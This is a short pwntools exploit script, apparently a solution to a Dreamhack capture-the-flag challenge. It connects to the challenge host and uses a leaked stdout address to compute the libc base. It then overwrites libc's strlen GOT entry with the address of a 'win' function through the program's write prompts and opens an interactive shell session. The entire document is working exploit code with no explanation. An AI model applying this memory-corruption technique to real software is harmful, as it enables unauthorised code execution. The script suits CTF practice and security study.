from pwn import *
#p = process('./main')
p = remote('host3.dreamhack.games', 21756)
p.recvuntil(b': ')
stdout = int(p.recvline().decode(), 16)
stdout_off = 0x21a780
libc_base = stdout - stdout_off
print(libc_base)
print(stdout)
p.recvuntil(b'win: ')
win_re = int(p.recvline().decode(), 16)
print(win_re)
libc_strlen_add = 0x219098
strlen = libc_base + libc_strlen_add
print(strlen)
p.sendlineafter(b': ', str(strlen).encode())
p.sendlineafter(b': ', str(win_re).encode())

p.interactive()